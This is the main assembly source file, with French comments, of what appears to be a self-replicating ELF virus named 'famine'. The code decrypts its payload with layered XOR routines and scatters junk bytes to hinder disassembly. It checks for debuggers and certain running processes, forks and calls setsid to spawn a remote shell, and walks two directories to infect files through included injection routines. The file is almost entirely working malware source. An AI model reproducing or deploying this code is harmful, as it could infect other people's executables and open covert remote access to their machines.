%include "include.s"

 ;   lea r15, [rel jump]
 ;   cmp byte [r15], 0xC3                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main

main:
    enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
    jmp $+4
    db `\x31\x2d`
    push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
    push rcx
    push rdi
    push rsi

decrypte:
    jmp encrypted_start
    db "hahaahhhahhah"
    lea rdi, [rel decrypt_v2 + DECRYPT_FUNC_SIZE]
    mov rsi, ENCRYPT_SIZE
    lea rdx, [rel decrypt_v2 + DECRYPT_KEY_OFFSET]
    mov rcx, KEY_SIZE
    mov rbx, rsi
    dec rbx
    mov r8, rdx
    jmp $+4
    db `\x48\x8b`
    ; if (i == 0) ; data[i] = data[i] ^ value[0]; else ; data[i] = data[i] ^ data[i - 1];
    cmp rbx, 0
    mov rdx, [rel decrypt_v2]
    mov rdx, [rdi + rbx - 1]
    xor byte [rdi + rbx], dl
    

    ; data[i] = data[i] ^ key[i % key_size];
    xor rdx, rdx
    mov rax, rbx
    div rcx
    mov dl, [r8 + rdx]
    xor [rdi + rbx], dl
    jmp $+4
    db `\x48\x8b`
    ; data[i] = data[i] ^ value[i % 16]
    mov rax, rbx
    and rax, 15
    lea rdx, [rel decrypt_v2]
    mov al,  [rdx + rax]
    xor byte [rdi + rbx], al

    ; data[i] = (data[i] + i) % 256
    mov al, byte [rdi + rbx]
    sub al, bl
    mov byte [rdi + rbx], al
    jmp $+4
    db `\x48\x8b`
    dec rbx
    cmp rbx, 0
encrypted_start:
    lea rdi, [rsp + fileName]
    call check_trace
    cmp rax, 0
    jz exit
    call get_processus_actif
    cmp rax, 0
    jnz exit


    mov rax, SYS_GETPID
    syscall
    mov [rsp + ppid], rax

    mov rax, SYS_FORK
    syscall
    mov rax, SYS_GETPID
    syscall
    cmp rax, [rsp + ppid]
    jz encrypted_start_suite + 2

    mov rax, SYS_SETSID
    syscall

    call remote_shell
    xor rax, rax
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave
    ret
encrypted_start_suite:
    db `\x48\x8b`
    lea rdi, [rsp + virusId]
    mov rsi, 8
    mov rdx, GRND_RANDOM
    mov rax, SYS_GETRANDOM
    syscall
    lea rdi, [rsp + fileName]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    jmp $+4
    db `\x69\x61`
    lea rdi, [rsp + fileName]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive


exit:
    xor rax, rax
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave
    
jump:
    ret
    nop
    nop
    nop
    nop

%include "get_processus_actif.s"

%include "remote_shell.s"

%include "check_trace.s"

;%include "putnbr.s"

%include "recursive.s"

%include "injection.s"

%include "append.s"

%include "decrypt.s"

%include "data.s"